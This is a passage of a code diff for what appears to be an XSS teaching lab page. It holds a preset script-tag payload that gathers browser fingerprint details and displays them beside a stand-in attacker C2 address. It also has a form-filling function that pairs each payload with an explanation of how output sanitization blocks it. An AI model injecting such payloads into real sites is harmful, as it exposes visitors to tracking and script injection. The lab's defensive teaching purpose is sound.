+        payload: `<script>!function(){var f={Browser:navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)/i)?navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)/i)[0]:'Unknown',Platform:navigator.platform,Language:navigator.language,Timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,Screen:screen.width+'x'+screen.height,CPU_Cores:navigator.hardwareConcurrency||'N/A',RAM_GB:(navigator.deviceMemory||'N/A')+' GB',Cookies_On:navigator.cookieEnabled,Touch_Points:navigator.maxTouchPoints,Plugins:navigator.plugins.length};var rows=Object.entries(f).map(function(e){return'<div style="display:flex;justify-content:space-between;padding:0.3rem 0;border-bottom:1px solid #1e293b"><span style="color:#64748b">'+e[0].replace(/_/g,' ')+'</span><span style="color:#a5f3fc">'+e[1]+'</span></div>'}).join('');var d=document.createElement('div');d.style.cssText='position:fixed;bottom:20px;left:20px;z-index:99999;background:#0f172a;border:2px solid #06b6d4;border-radius:12px;padding:1.25rem 1.5rem;font-family:monospace;font-size:11px;color:#fff;min-width:320px;box-shadow:0 8px 30px rgba(6,182,212,0.25)';d.innerHTML='<div style="color:#06b6d4;font-weight:900;font-size:0.9rem;margin-bottom:0.75rem">🎯 BROWSER FINGERPRINT CAPTURED</div>'+rows+'<div style="margin-top:0.75rem;color:#475569;font-size:10px">→ http://attacker-c2.evil/fingerprint</div><button onclick="this.parentElement.remove()" style="position:absolute;top:0.6rem;right:0.75rem;background:none;border:none;color:#555;cursor:pointer">✕</button>';document.body.appendChild(d)}()<\/script>`
+      },
+      custom: {
+        label: 'Custom Payload',
+        icon: '✏️', color: '#10b981', risk: 'SECURE',
+        desc: 'Write your own XSS payload.',
+        mitigation: 'Unknown payload. PHP output sanitization neutralized all special HTML characters preventing code execution.',
+        name: '', payload: ''
+      }
+    };
+
+    function selectAttack(key) {
+        const a = ATTACKS[key];
+        if (!a) return;
+
+        // Highlight button
+        document.querySelectorAll('.attack-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById('btn-' + key).classList.add('active');
+
+        // Update info box
+        const info = document.getElementById('attack-info');
+        info.style.borderColor = 'rgba(16, 185, 129, 0.4)';
+        info.style.background  = 'rgba(16, 185, 129, 0.08)';
+        info.innerHTML = `
+            <div class="info-title" style="color:#059669">
+                ${a.icon} ${a.label}
+                <span class="risk-tag risk-secure" style="margin-left:auto;">${a.risk}</span>
+            </div>
+            <div class="info-desc">${a.desc}</div>
+            <div id="mitigation-info" style="margin-top:0.75rem; padding-top:0.75rem; border-top:1px dashed rgba(16, 185, 129, 0.3); font-size:0.8rem; color:#059669; background:rgba(16, 185, 129, 0.05); padding:1rem; border-radius:8px;">
+                <div style="display:flex; align-items:center; gap:0.4rem; font-weight:700; margin-bottom:0.25rem; font-family:var(--font-heading);">
+                    <i data-feather="shield-check" style="width:14px; height:14px;"></i> Mitigation Explanation
+                </div>
+                <span id="mitigation-text" style="color:#475569; font-family:var(--font-body);">${a.mitigation}</span>
+            </div>`;
+        
+        feather.replace();
+
+        // Fill form
+        document.getElementById('attack_type_input').value = a.label;
+        if (a.name !== '') document.getElementById('name').value = a.name;
+        if (a.payload !== '') document.getElementById('comment').value = a.payload;
+        if (key === 'custom') {
+            document.getElementById('comment').value = '';
+            document.getElementById('comment').placeholder = 'Write your own XSS payload here...';
+            document.getElementById('name').value = '';
+        }
+
+        // Update badge
+        const badge = document.getElementById('active-attack-badge');
+        badge.style.display = 'inline-flex';
+        badge.textContent = a.icon + ' ' + a.label;
+    }
+    </script>
+</body>
+</html>
